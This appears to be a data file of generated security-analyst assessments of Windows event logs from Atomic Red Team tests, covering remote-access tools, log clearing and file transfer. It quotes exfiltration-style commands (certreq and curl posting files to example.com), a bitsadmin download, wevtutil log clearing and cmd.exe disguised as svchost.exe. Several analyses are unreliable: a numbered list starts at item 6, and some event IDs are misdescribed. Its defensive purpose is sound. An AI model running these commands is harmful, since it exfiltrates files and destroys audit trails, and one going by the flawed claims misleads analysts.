   - Multiple entries in the Sysmon logs show execution of PowerShell with the command `""powershell.exe"" & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\ammyy.exe\""}`. The invocation of Ammyy Admin (ammyy.exe) indicates the potential execution of a remote administration tool without proper authorization or knowledge of the administrators. This activity suggests malicious intent, as Ammyy Admin is often used in remote access attacks.

3. **Unusual Process Executions:**
   - Various processes are executed by the ""admin_test"" user within a short period, with high integrity level and originating from system directories, such as `conhost.exe` and `whoami.exe`. The rapid execution of a multitude of processes, especially those typically used for system administration and reconnaissance (like whoami.exe), can be suspicious if not associated with typical user activity.

4. **Edge Update Activity:**
   - The logs capture extensive use of MicrosoftEdgeUpdate processes which, in isolation, could be benign if these activities represent genuine software updates. However, the context of concurrent suspicious activities raises concerns about whether these updates are potentially leveraged to mask other activities or installations (e.g., downloading additional payloads).

**Assessment:**  
The combination of event log clearing, suspicious use of PowerShell scripts to execute external payloads located in temporary directories, and the clearing of logs all suggest an attempt to cover up potentially unauthorized or malicious activities. Additionally, the invocation of Ammyy Admin could be an attempt at establishing persistent remote access.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the host (Server002) from the network to prevent further compromise or lateral movement.
  - Conduct a thorough forensic analysis to capture volatile data and memory dumps, aiming to identify any active connections or persistence mechanisms.
  - Examine user account activity for any unauthorized access, especially the ""admin_test"" account.
- **Remediation:**
  - Change all relevant credentials, especially administrative accounts.
  - Review and tighten security policies, including logging and monitoring settings.
  - Implement application whitelisting to prevent unauthorized execution of applications like Ammyy Admin.
- **Prevention:**
  - Conduct security awareness training highlighting the dangers of downloading or executing unknown applications.
  - Implement network segmentation and enhance monitoring for indications of lateral movement or command and control activity.

Review these recommendations with incident response and IT operations teams to ensure a coordinated and effective response."
UltraViewer - RAT Execution,"Upon reviewing the provided collection of Windows event logs, several activities stand out that suggest the presence of potential malicious behavior. Key findings and analysis are as follows:

1. **Use of PowerShell for External Execution:**
   - Logs indicate the use of PowerShell to execute processes related to **UltraViewer.exe**, a remote desktop software, located in a temporary path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1219_UltraViewer.exe`). The use of PowerShell to start processes from temporary directories can indicate suspicious behavior often leveraged for malicious activities.

2. **Event Log Clearing:**
   - Security logs show that the `admin_test` account cleared the event logs, specifically event 1102, which points to the clearing of the security event logs. This often serves as an attempt to delete evidence of malicious activity.

3. **Service Installation:**
   - There are indications of the installation and setup of a service named ""UltraViewer Service"" with auto start, reported in the System log. The service appears to be set up using UltraViewer software executed by the same PowerShell commands. Services installed without legitimate user action and legitimate purpose are often utilized by attackers for persistence.

4. **Registry Modification:**
   - Instances of ""RegAsm.exe,"" a Microsoft .NET Assembly Registration Utility, have been used to register DLLs related to UltraViewer. Unauthorized registry modifications, especially those involving COM objects, can be a vector for persistence and application hijacking.

5. **Credential Theft Attempts:**
   - Multiple event IDs, such as 5379, indicate failed attempts to query credentials for a `MicrosoftAccount` user. This could be a sign of unsuccessful credential access attempts or lateral movement activities.

6. **Task Manipulation and Execution:**
   - The concurrent execution of multiple `taskkill` commands targeting UltraViewer-related applications suggests potential interference with existing service operations, possibly indicating an attacker gaining and then trying to suppress traces of remote control via UltraViewer.

7. **Behavior Indicating Attack Framework Usage:**
   - References to `AtomicRedTeam`, which is a known framework used to test security configurations against TTPs (Tactics, Techniques, and Procedures), imply that this activity might either simulate attacks or use similar methodologies for real attacks.

### Conclusion: MALICIOUS

Based on the duplicate usage of PowerShell for potentially executing malicious processes, event log deletions, unauthorized registry modifications for persistence, service installation for potential unauthorized remote access, and failed credential access attempts, there are strong indicators of malicious activity in the Windows event logs.

### Recommendations:
- Immediately isolate the affected system from the network to prevent further potential compromise.
- Conduct a thorough forensic analysis to determine the extent of the compromise, specifically scrutinizing the `admin_test` user account activities and any further trace of UltraViewer operations.
- Ensure all logs and timestamps are preserved for future investigations.
- Review and potentially reset credentials associated with affected accounts, especially those with elevated privileges.
- Assess and fortify system monitoring and defenses to prevent similar incidents."
RemotePC Software Execution,"Upon analyzing the provided logs, certain events stand out and indicate potentially suspicious or malicious activities:

1. **Clearing of Event Logs**: The logs contain multiple instances of event log clearing, particularly for the Security and System logs (Event IDs 1102 and 104). This is typically a red flag as attackers often clear event logs to cover their tracks and hide their activities on the system.

2. **Suspicious Process Execution**: There is a consistent pattern of processes related to 'RemotePC' being executed and then removed shortly thereafter. These involve several installer and setup processes that could be indicative of various steps in establishing a remote access tool:
   - The execution of `powershell.exe` with commands to start a process involving `RemotePC.exe`. This is found in the PowerShell logs and is often seen in malware deployment stages.
   - Execution and uninstallation activities for various RemotePC components such as `RemotePCSetup`, `RemotePCService`, and other related executables.

3. **Creation of Services**: The logs capture the creation of a new service `RPCService` with executable `RemotePCService.exe`, registered to start automatically under the local system account. This behavior is characteristic of establishing persistence or backdoor creation, a common technique used by malware to remain operational after a system reboot.

4. **Event Log Entries from Sysmon**: The Sysmon logs show a significant number of new processes and command executions related to `RemotePC`, indicating the installation and possible operation of these applications. These entries correlate with the creation of the RPCService, suggesting an intentional propagation of these processes.

5. **Potential Misuse of Windows Services**: The logs show multiple service control manager activities related to starting, stopping, and creating services. Although some could be benign, their synchronization with other suspicious entries reinforces the hypothesis of malicious activity.

Based on the analysis above, the logs contain several strong indicators of potentially malicious activity. These include event log clearing, suspicious execution of processes related to remote access tools, and creation of services that may indicate persistence mechanisms.

**Final Assessment**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately investigate the origin and intent of the `RemotePC` executables and services.
- Conduct a thorough system scan for further malware, and potentially disconnect the system from the network to prevent further unauthorized access or data exfiltration.
- Monitor network traffic for unusual outbound connections that might indicate communication with a command-and-control server.
- Consider re-imaging the system if a root cause or remediation cannot be accurately determined.
- Strengthen logging and monitoring capabilities, employing tools that can alert on unauthorized log clearance and unusual service creation."
Testing usage of uncommonly used port with PowerShell,"Upon analyzing the provided logs, a few key events stand out and merit further examination:

1. **Event ID 1102 in Security Log and Sysmon Log:**
   - The event with ID 1102 indicates that the security log was cleared by the user ""admin_test"". This is often a red flag because malicious actors attempt to cover their tracks by deleting logs. The Sysmon log corroborates this by showing ""wevtutil.exe"" being executed with the 'cl' (clear log) flag for various system logs, including Security and Windows PowerShell. 

2. **Repeated Privileged Logons and Privilege Use:**
   - There are multiple ""Event ID 4624"" entries indicating successful logons, along with ""Event ID 4672"" which shows special privileges being allocated (such as SeDebugPrivilege). These privileges could be used for malicious purposes, especially when coupled with a security log clearance.
   
3. **Use of Taskhostw and CompatTelRunner:**
   - Several events show the execution of ""taskhostw.exe"" and ""CompatTelRunner.exe"". While these can be benign under normal circumstances, their association with other suspicious activities, like log clearance operations, might hint towards malicious activity.

4. **PowerShell Execution:**
   - The PowerShell log entry shows the ""Test-NetConnection"" command directed towards an external site (google.com) at a non-standard port (8081). PowerShell usage is common in lateral movement and external communications in attack vectors.

5. **Event ID 4798 in Security Logs:**
   - This event shows ""Query for Group Policy"" with entries for several accounts, including ""Administrator"", ""Guest"", etc. Such queries can be part of reconnaissance attempted by an attacker to gain more knowledge about the domain's user accounts.

The combination of these events suggests the possibility of malicious activities:

- **Log Clearing:**
  The explicit log clearing is one of the most telling signs of potential malicious activity, as it is commonly done by attackers after compromising a system to erase their tracks.

- **Privilege Escalation:**
  The frequent elevation of privileges through logging in with elevated tokens could suggest an attempted privilege escalation attack.

- **Unknown Activities with Familiar Tools:**
  Tools like taskhostw.exe and CompatTelRunner.exe can be used in non-standard ways during attack routines.

**Recommendation and Resolution:**

Given the signs of log clearing, potential privilege escalation, and the usage of network and system administration tools without clear justification during this timeline, this activity is leaning towards being **MALICIOUS**. Further detailed investigation and immediate review of access permissions and additional system hardening is advised. It is recommended to conduct a full security audit, run additional forensic analysis on the system, and possibly contact an incident response team if not yet involved.

Ensure all system patches are up-to-date, increase logging verbosity, and closely monitor this and similar systems for unusual behavior. It's also prudent to remind all users about security best practices and have in place a strong incident response plan."
UltraVNC Execution,"Analysis:

The provided logs exhibit a series of activities that indicate potentially malicious behavior. Here's a detailed breakdown:

1. **Process Execution and Command-Line Arguments:**
   - A number of events show the execution of `wevtutil.exe` with the `cl` (clear log) command on various logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This is usually not a common practice unless specifically intended for maintenance or incident response purposes. The clearing of logs can suggest an attempt to hide malicious activities.
   
   - The process `setpasswd.exe` and `setcad.exe` from UltraVNC have been executed. These are typically associated with setting up or modifying configurations in UltraVNC installations, and running these unexpectedly, particularly when paired with other suspicious activities, may indicate unauthorized remote access attempts or persistence mechanisms.

   - The use of `netsh.exe` to add firewall rules opening TCP ports 5900 and 5800 (commonly associated with VNC) implies an attempt to allow remote access via VNC without restrictions, which is a common technique used by attackers for persistent remote access.

   - Execution of `powershell.exe` with a command that uses Start-Process to launch `vncviewer.exe` further supports this suspicion, as PowerShell can be used for script-based attacks or to run commands with specific user privileges.

2. **Log Clearing:**
   - The administrator account `admin_test` cleared several logs (`System`, `Security`, `Windows PowerShell`) within a short span of time. Log clearing is often performed by attackers following a compromise to cover tracks.

3. **Unauthorized Modifications:**
   - The process `vncsetup.tmp` is executed from the Temp directory, indicating the possibility of a VNC setup that was staged unexpectedly. This, combined with commands to modify firewall settings and set passwords through UltraVNC tools, strongly supports the hypothesis of an attacker setting up an unauthorized remote access mechanism.

4. **Security and Event Logs:**
   - The security logs show a Log Cleared Event (`EventID: 1102`) and additional user enumeration activities (`EventID: 4798`), potentially in an attempt to gather information about system users and their roles.

Assessment and Resolution:
The behavior observed in the logs suggests an attempt to establish unauthorized remote access and hide these activities, which are strong indicators of a compromise. The combination of unauthorized process executions, particularly the use of PowerShell and VNC-related tools, alongside suspicious log-clearing activities, aligns with attack patterns designed to gain persistence and evade detection.

Resolution: **MALICIOUS**

Guidance on how to proceed:
- Immediately isolate the affected host from the network to prevent further potential unauthorized access.
- Conduct a comprehensive forensic investigation to identify the extent of the compromise.
- Review and revoke any unauthorized firewall rules and examine all user accounts for unauthorized changes.
- Verify system integrity, reinstall affected software as necessary, and consider conducting a full system rebuild if compromise is confirmed.
- Enhance monitoring and logging practices to detect similar behaviors in the future and apply necessary security patches.
- Notify relevant stakeholders and consider legal or regulatory obligations for reporting security incidents."
Psiphon,"### Detailed Analysis of Logs

Upon examining the logs provided, a series of suspicious activities have been identified that indicate potential malicious actions on the host.

#### Indicators of Suspicious Activities

1. **Clearing of Event Logs:**
   - In the System log, events indicate that the event logs (System and Windows PowerShell channels) were cleared by a user `admin_test` at `2024-10-24 09:16:26`. The clearing of multiple logs by a non-system user is generally considered suspicious as it could be an attempt to hide certain activities.

2. **Use of `wevtutil.exe`:**
   - The Sysmon logs show multiple executions of `wevtutil.exe`, a command-line utility for managing event logs. Each of these is followed closely by the event logs being cleared (Event ID 104). Such activities are often indicative of logs being manipulated, which is a common technique used by attackers post-compromise to remove evidence of their activities.

3. **Execution of Potentially Malicious Scripts:**
   - The PowerShell logs record an execution of `Psiphon.bat`, under `powershell.exe`, a script located under a suspicious path `AtomicRedTeam\T1090.003\src\`. Atomic Red Team techniques are often used in simulations for threat emulation and may indicate a penetration test or real attack aiming at proxying traffic or conducting lateral movement within the network.
   
4. **Suspicious Command Line Usage:**
   - In the Sysmon logs, there are entries of `cmd.exe` with the command-line arguments that appear suspicious (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1090.003\src\Psiphon.bat`). The Temp directory is a common area for launching temporary malicious scripts.

5. **Repeated Use of System Trusted Tools:**
   - Multiple legitimate Windows processes such as `whoami.exe`, `hostname.exe`, and `taskhostw.exe` were executed within a short period and appear in the Sysmon logs. The rapid and repeated use of these might suggest a reconnaissance phase by an attacker to gather information about the system and user permissions.

6. **High-Integrity Level Processes:**
   - Several processes were executed with high integrity, indicating that they were running with elevated privileges, a potential sign of privilege escalation or use of scripts/admin rights by unauthorized individuals.

7. **Multiple Logons and Privilege Assignments:**
   - Various events indicate multiple logon attempts (Event ID 4624) and privilege assignments (Event ID 4672) to the `SYSTEM` account. While this could be regular system behavior, the timing with other suspicious activities makes it worthy of investigation.

### Assessment

With the evidence of event logs being cleared, the use of `Psiphon.bat` script, and the rapid and elevated access tasks, there's a strong suspicion of compromise or at least unauthorized activity that could lead to a potential breach.

### Resolution

- **Resolution: SUSPICIOUS**
  The logs contain activity that is out of the ordinary, suggesting potentially malicious actions impacting security. This necessitates a further in-depth investigation to determine the cause and scope of these actions.

### Guidance on How to Proceed

6. **Awareness Training:**
   - Provide security awareness training to employees highlighting the risks associated with unauthorized script execution and log tampering.

Conducting these actions will help in understanding the full extent of the activities, mitigate future occurrences, and secure the environment adequately."
svchost writing a file to a UNC path,"### Detailed Analysis of the Logs

Upon reviewing the provided event logs, I have identified several instances of potentially suspicious and malicious activity. Below is a detailed analysis:

#### Sysmon Log Analysis:
1. **Use of `wevtutil.exe` to Clear Event Logs:**
   - The logs show multiple instances of `wevtutil.exe` being used by the user `admin_test` to clear event logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This is indicated by command-line invocations like:
     - `C:\\Windows\\system32\\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `C:\\Windows\\system32\\wevtutil.exe cl Security`
   - **Malicious Behavior:** Clearing event logs is a tactic often used by malicious actors to cover their tracks after illicit activities.

2. **Anomalous Process Execution with `cmd.exe` and `svchost.exe`:**
   - A command was executed using `cmd.exe` that copied the Command Processor to another location (`C:\svchost.exe`) and executed a potentially suspicious command to create a file remotely (T1105):
     ```plaintext
     ""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
     ```
   - **Suspicious Activity:** The use of `cmd.exe` to copy itself as `svchost.exe` and launch is indicative of tactics used in living-off-the-land binaries (LOLBins) attacks.

#### System Log Analysis:
1. **Event Logs Cleared:**
   - The `System` log records indicate the clearing of logs as well:
     - `EventID: 104` signifies that event logs were cleared by `admin_test`.

2. **Time Change Events:**
   - **Kernel-General Events** show time manipulation, possibly to manipulate timestamps:
     ```plaintext
     OldTime: 2024-10-24 11:31:42.0287023
     NewTime: 2024-10-24 11:31:39.8581599
     ```
   - **Suspicious Activity:** Altering system time can be used to disrupt event log timelines or forensic investigations.

#### Security Log Analysis:
1. **Security Log Cleared:**
   - `EventID: 1102` indicates the security log was cleared by `admin_test`.

#### Indicators of Malicious Activity:
- **Use of System Utilities for Anomalous Actions:** `wevtutil.exe` usage to clear logs can be a red flag, especially when tied with similar activities like executing commands with `cmd.exe`.
- **Command Obfuscation and Execution:** The creation of the `svchost.exe` copy and execution point to the possible intent to obfuscate commands to bypass detection or conduct unauthorized actions stealthily.
- **Event Log Clearing:** Consistent clearing of logs from multiple channels is a significant indicator of malicious activity, aimed at removing traces of unauthorized actions.

### Threats and Risks Identified
- **Log Tampering and Evasion:** The primary threat identified is tampering with event logs, indicative of a larger attempt to evade detection.
- **Potential for Elevated Privileges Operations:** Given the logs include entries indicating privilege logging (e.g., `SeDebugPrivilege`), there is potential for unauthorized access or actions being performed with elevated privileges.
  
### Guidance on How to Proceed
1. **Immediate Response:**
   - Investigate and temporarily disable the account `admin_test` to prevent further actions until a thorough review is completed.
   - Conduct a forensic investigation on `Server002` to ascertain additional impacts or unauthorized changes made.

2. **Monitoring and Hardening:**
   - Increase monitoring for similar behaviors of log clearing and time changes.
   - Review systems for incident indicators and ensure audit policies are set to capture similar future activities.
   - Revisit security policies and implement restrictions against the misuse of utilities like `wevtutil.exe`.

### Resolution: MALICIOUS
Based on the evidence of log clearing, command obfuscation, and suspicious use of system utilities, there is sufficient indication of malicious activity. The log activity aligns with tactics, techniques, and procedures (TTPs) typical of threat actors engaging in system compromise and evasion."
Download a File with Windows Defender MpCmdRun.exe,"Upon reviewing the provided event logs for Server002, several activities stand out as potentially indicative of malicious behavior. Here is a detailed analysis:

1. **Event Logs Cleared:**
   - Event IDs 104 from System logs and 1102 from Security logs show that logs have been cleared by the user `admin_test`. Clearing logs is a typical action undertaken by malicious actors to remove traces of their activities.

2. **Command-Line Execution:**
   - The execution of `cmd.exe`, `wevtutil.exe`, and `MpCmdRun.exe` by the user `admin_test` is suspicious. `wevtutil` is used to clear event logs, which aligns with the log clearing events seen earlier.
   - The use of `MpCmdRun.exe` via command-line (`& MpCmdRun.exe /? >nul 2>&1`) is unusual if it’s not standard operational procedure, indicating a possible attempt to test or prepare for defensive measures.

3. **Privilege Escalation:**
   - Events with ID 4672 show that privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` have been assigned to the SYSTEM user. While not uncommon, given the context of the log clearing, this further suggests potential abuse of privileges.

4. **Time Change Events:**
   - There's a pattern of time adjustments synchronized with an NTP server (`time.windows.com`). While this could be normal system behavior, it can also obscure traces if not expected or logged frequently.

5. **Svchost.exe and System Processes:**
   - Multiple `svchost.exe` processes are shown interacting with key system functions. Although common, in combination with the other suspicious activities, this could merit deeper inspection if these processes deviate from baseline behaviors known to the organization.

6. **Microsoft Edge Update Activities:**
   - Many events corresponding to Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) are seen. These could be benign related to automated updates; however, if combined with unauthorized activity, it might be worth verifying those updates as legitimate.

### Conclusion

Based on the analysis, there is a pattern of suspicious behavior, especially surrounding the clearing of logs and use of privileged commands and processes. Given the context, these activities are indicative of potential compromise or malicious intent, aiming to cover up tracks related to further actions.

**Assessment: SUSPICIOUS**

### Guidance on How to Proceed:
- **Validate User Intent**: Investigate `admin_test` user activity, looking at recent tasks, roles, and if their actions align with expected duties.
- **Review Log History**: If possible, attempt to recover cleared logs or backups to trace preceding events.
- **Network Activity**: Analyze network logs around the time of these events for any unauthorized access or data exfiltration attempts.
- **Endpoint Inspection**: Conduct an endpoint investigation on Server002, focusing on registry changes, unauthorized software installations, and file system changes.
- **Increase Monitoring**: Apply additional monitoring on the system and user accounts for any further suspicious activities.

Further investigation is required to confirm whether these activities are benign, due to an insider threat, or the result of external malicious interference."
DNS over HTTPS Regular Beaconing,"Upon careful analysis of the provided Windows event logs, I've identified several suspicious activities that warrant further investigation.

### Suspicious Activities:
1. **Time Discrepancy and Time Manipulation**: 
   - **Event ID 4616 (Security log)**: The event logs indicate multiple time change events occurring in quick succession (within milliseconds). The `PreviousTime` and `NewTime` fields show discrepancies, suggesting potential unauthorized time manipulation.
   - **Event ID 1 (System log)**: Corresponding Kernel-General events indicate the system time was set back. This behavior can be associated with attempts to confuse logging and alerting mechanisms.

2. **Clearing of Event Logs**:
   - **Event ID 1102 (Security log) and Event ID 104 (System log)**: Logs were cleared by the user `admin_test`. Log clearing is often a tactic used by attackers to cover their tracks.
   
3. **Execution of Suspicious PowerShell Script**:
   - **Event ID 600 (Windows PowerShell log)**: A PowerShell script (`T1572-doh-beacon.ps1`) related to Atomic Red Team testing is being executed with complex command line arguments indicative of communication potentially used for Command and Control (C2) purposes via DNS over HTTPS (DoH). 
   - The script is executed with high integrity level, indicating it ran with elevated privileges, which is common in malicious activity.

4. **PowerShell Execution Context**:
   - PowerShell logs (event IDs ranging 600-600) show consistent execution under a specific temporary directory (`AtomicRedTeam`) with parameters aligning with simulated attack scenarios.

5. **Network Activity and High Privilege Access**:
   - The `admin_test` account has elevated privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, which are typically required for backup operations but could be misused for malicious activities.

### Assessment:
Based on the review above:
- The execution of suspicious PowerShell scripts in combination with time manipulation and event log clearing by a user with elevated privileges strongly suggests an attempt to perform covert activities, which could point to unauthorized or malicious behavior.

### Resolution:
**MALICIOUS**: The combination of activities present in these logs strongly indicates malicious intent. The execution of complex PowerShell with potential C2 scripts, time manipulation, and log clearance are classic indicators of a system compromise.

### Guidance:
1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further potential malicious activities.
2. **Investigation**: Conduct a thorough forensic investigation to:
   - Recover deleted logs if possible.
   - Analyze the executed PowerShell scripts and any other related artifacts.
3. **Review and Revoke Privileges**: Review the `admin_test` account for unauthorized changes and revoke unnecessary privileges.
4. **Patch and Update**: Ensure the system is up to date with security patches to prevent exploitation of any known vulnerabilities.
5. **Security Awareness**: Consider training for system administrators on the best practices for account privilege management and anomaly detection."
certreq download,"Upon analyzing the provided logs, several details stand out, suggesting potential malicious activity:

1. **Log File Deletion and Associated Commands**:
   - Windows Event logs (`EventID: 1102`) record that the security event log was cleared by `admin_test`. Simultaneously, system logs (`EventID: 104`) also indicate the clearing of system and PowerShell logs by the same user.
   - These actions are frequently associated with malicious activity attempts to cover tracks.

2. **Process Execution**:
   - A series of processes related to `wevtutil.exe` were executed by `SERVER002\\admin_test`. The command explicitly uses `wevtutil.exe cl` to clear logs (e.g., for Sysmon, Application, System, Security, Windows PowerShell), which aligns with the behavior where logs were suspiciously cleared.
   - Commands like `cmd.exe /c certreq.exe -Post -config https://example.com c:\\windows\\win.ini %%temp%%\\Atomic-license.txt` are unusual, especially the use of `certreq.exe` in such a manner and potential data transmission to an external URL (`https://example.com`).

3. **User Privileges**:
   - `admin_test` seems to have unusually elevated privileges with the ability to clear logs and execute commands that would require administrative access. Event `4672` indicates that `admin_test` had high privileges.

4. **Unusual Commands**:
   - Multiple invocations of `conhost.exe` directly associated with `wevtutil.exe` execution are suspicious if not expected. 
   - The combination of utilities used (such as `whoami.exe`, `wevtutil.exe`, `cmd.exe`) typically suggests diagnostic or enumeration activity which should be correlated with legitimate administrative tasks or questioned.

5. **Edge Update Process**:
   - Numerous `MicrosoftEdgeUpdate.exe` processes running with SYSTEM privileges are typical for automatic updates, suggesting normal software behavior. These do not stand out as suspicious.

### Conclusion:
Given the combination of log clearing activities, elevated privileges, and suspicious command executions (network activity involving `certreq.exe`), this host's event logs demonstrate clear signs of malicious intent.

### Resolution:
**MALICIOUS** - The activities observed indicate a probable breach or policy violation, with log tampering and suspicious command-line executions designed to either cover tracks or perform unauthorized network actions. Immediate action is recommended to isolate the affected system, conduct a comprehensive forensic investigation, and potentially involve incident response teams to mitigate further risks."
Windows - BITSAdmin BITS Download,"Based on the provided logs, here's a comprehensive analysis of potential suspicious or malicious activity:

### Suspicious and Anomalous Activities:

1. **Log Clearing Events:**
   - A prominent indicator of potential malicious activity is the clearing of event logs. The logs show multiple instances of event logs being cleared:
     - **Security Log:** EventID 1102 indicates that the security log was cleared by the user `admin_test`.
     - **System Log:** EventID 104 for both the System and Windows PowerShell channels, cleared by the user `admin_test`.

   Clearing logs is a common tactic used to cover tracks post-compromise, especially when activities might have triggered alerts or attracted attention.

2. **Wevtutil Executions:**
   - There were multiple executions of the `wevtutil.exe` utility:
     - Command lines such as `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`, `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, and others for clearing various logs have been recorded.
   - These command lines suggest an attempt to clear specific event logs, which correlates with the log clearing activities observed. The parent process for these was `wsmprovhost.exe`, which is associated with Windows Management Instrumentation tasks, commonly used for remote management.

3. **Bitsadmin Download:**
   - The Sysmon logs display a process execution of `cmd.exe` initiating `bitsadmin.exe` to download a file from a remote URL:
     - `""C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt""`
   - While the URL itself is pointing to a benign text file (a license text from a well-known GitHub repository), the method and execution are suspicious. Bitsadmin is sometimes used by attackers for malicious downloads due to its ability to operate with system privileges and be less likely to be detected.

4. **Process Execution Patterns:** 
   - Several utility processes such as `whoami.exe` and `hostname.exe` were executed. While `whoami.exe` is benign when used sparingly, repeated or scripted usage can indicate an attacker is querying the identity context of a compromised session.

### Assessment:

The combination of cleared event logs and the sequence of utility executions strongly suggests suspicious activities that warrant further investigation. Although not outrightly malicious due to the benign file involved in the bitsadmin download, the tactics align with potential cover-up or reconnaissance activities in a post-compromise environment.

### Recommended Actions:

1. **Immediate Investigation:**
   - Conduct a thorough investigation of the `admin_test` account workings and privileges. Verify whether the actions were legitimate administration tasks or unauthorized activities posing as such.

2. **Review Configuration and Security Policies:**
   - Examine the system's security configuration for weaknesses that allow unauthorized log clearing and unrestricted internet access using system utilities.

3. **Threat Hunting and Monitoring:**
   - Enhance monitoring and alerting on usage of log clearing tools and command-line utility executions.
   - Trace the network and user activities to identify any lateral movements or related activities.

4. **Incident Response:**
   - If unauthorized access is confirmed, initiate the incident response plan, including isolating affected systems and possibly resetting credentials or securing access points.

### Resolution: SUSPICIOUS

The logs contain activities that are suspicious and require deeper investigation to verify whether there’s an ongoing or potential security threat."
MSP360 Connect Execution,"Upon reviewing the provided event logs from the Windows host, I have identified several activities that raise concerns and warrant further investigation:

1. **PowerShell Execution**:
   - **PowerShell Activity**: The PowerShell logs show the execution of a command with `powershell.exe & {Start-Process $env:ProgramFiles\Connect\Connect.exe}`. Using PowerShell to launch other processes can be normal, especially if related to legitimate administrative tasks. However, it's important to verify the legitimacy of `Connect.exe` in the `$env:ProgramFiles\Connect` directory to ensure it is not malicious or unknown software.

2. **Log Clearance**:
   - **Event log clearance**: The System, Windows PowerShell, and Security logs have been cleared by the user ""admin_test."" While legitimate administrators can clear logs, frequent or unexpected log clearance can be an indicator of an attacker trying to cover their tracks.

3. **Sysmon Activity**:
   - **Wevtutil log clearance command**: The `wevtutil` command-line utility was used to clear logs, which is followed by processes related to log clearance (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, etc.). This aligns with the event log clearance activity.
   - **High-integrity level processes**: The activities were performed with high integrity, indicating they had elevated privileges, which might be concerning if not expected.
   
4. **Security Concerns**:
   - **Event 1102**: This is a security event indicating that the audit log was cleared. This can potentially be malicious if it is not part of a regular administrative procedure or not authorized by a security protocol.

5. **Additional Observations**:
   - **Microsoft Edge Update**: A significant number of Sysmon entries are related to Microsoft Edge updates. These appear normal as they involve update processes and could be a regular scheduled task managed by the system (unless specific concerns about Edge updates are present).

### Assessment:

The logs exhibit behavior typical of a potential compromise:
- The clearing of logs by `admin_test` can be interpreted as an attempt to hide malicious activity.
- The PowerShell command could be benign but needs verification regarding what `Connect.exe` is and its purpose.
- The repetitive use of `wevtutil.exe` to clear logs further supports this suspicion.

### Guidance on How to Proceed:

- **Verify the legitimacy** of the `Connect.exe` application executed via PowerShell.
- **Check with the user** 'admin_test' and system administration logs to determine if the log clearance activity was legitimate. If this was unsanctioned, immediate security measures should be taken.
- If suspicious behavior or malware is suspected, consider performing a **full malware scan** on the host and check for any unauthorized software installations.
- Increase **monitoring and logging** on the system for any anomalous activities and review firewall logs or network security tools to detect any unusual outbound network traffic.
  
### Final Resolution:
- **SUSPICIOUS**: The events logged present activities that are concerning and warrant further investigation to confirm whether they are benign administrative actions or indicative of a security breach."
Curl Upload File,"### Detailed Log Analysis:

Upon reviewing the provided logs, several key observations stand out:

#### 1. Log File Clearing:
- **System Log & Security Log**: The logs indicate that logs were cleared by the user `admin_test`. This activity can be seen from the following entries:
  - System log cleared at `2024-10-24 11:51:59.1365546`.
  - Windows PowerShell log cleared at `2024-10-24 11:51:59.3450758`.
  - Security log cleared at `2024-10-24 11:51:59.2131173`.
  
  The use of `wevtutil.exe` is evident from Sysmon logs, showing the command-line invocations to clear the logs across several channels, which correlate with these events.
  
  **Assessment**: Clearing of event logs is typically a red flag, especially when done in succession and without a proper audit trail or management approval. It indicates an attempt to remove traces of activity.

#### 2. Use of System Utilities and Command-line Scripts:
- **Sysmon Log**: Shows various executions of system utilities like `wevtutil.exe`, `cmd.exe`, and `curl.exe`. Notably:
  - `cmd.exe` executing multiple `curl` commands to transfer a file named `atomictestfile.txt` to `www.example.com` suggests potential data exfiltration.

  **Assessment**: The use of `curl` in this context indicates possible unauthorized data transfer or command-and-control communication, which could be part of a larger malicious activity.

#### 3. Unusual Command Execution:
- **Sysmon Log, Event ID 1**: Shows the execution command `\""cmd.exe\"" /c C:\\Windows\\System32\\Curl.exe...`.
  
  **Assessment**: Using command-line tools in such a manner, particularly with the objective of uploading files to an external server, is suspicious and consistent with malicious tactics.

#### 4. Multiple executions by `admin_test`:
- **Sysmon Log**: Many processes like `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `curl.exe` were invoked under the `admin_test` account.
  
  **Assessment**: This further connects the actions to a privileged user, highlighting potential misuse of access levels or account compromise.

### Final Assessment:

The logs present clear indicators of potentially malicious behavior:
- The systematic clearing of logs suggests an intention to cover tracks.
- Multiple suspicious executions using system utilities, especially with the `curl` commands directed to an external URL, indicate possible data leakage or unauthorized network communication.
- The actions were executed under an administrative account, adding a layer of unauthorized privilege use or account misuse.

**Resolution**: MALICIOUS

### Recommended Actions:

1. **Immediate Account Audit**: Conduct an audit on the `admin_test` account for unusual access patterns and secure or reset credentials if necessary.
2. **Network Traffic Inspection**: Investigate network traffic to verify communication with `www.example.com` and take necessary steps to prevent further potential data exfiltration.
3. **Review System Security Policies**: Ensure logging and alerting mechanisms are robust, particularly around the use of PowerShell and command-line utilities.
4. **Forensic Analysis**: Engage in a deeper forensic investigation on the host to understand the full scope of malicious activity and assess potential damage or data loss.

Engage with the security operations team to enforce immediate containment and remediation steps as required."
Splashtop Streamer Execution,"After analyzing the provided Windows event logs, several observations suggest potentially suspicious behavior that merits further investigation:

1. **Repeated Usage of `wevtutil.exe`:** The logs show multiple instances of `wevtutil.exe` being used to clear several event logs: Microsoft-Windows-Sysmon/Operational, Application, System, Security, Windows PowerShell, and System. The use of `wevtutil.exe` to clear logs is suspicious as this can be an indication of an attempt to cover malicious activity traces. 

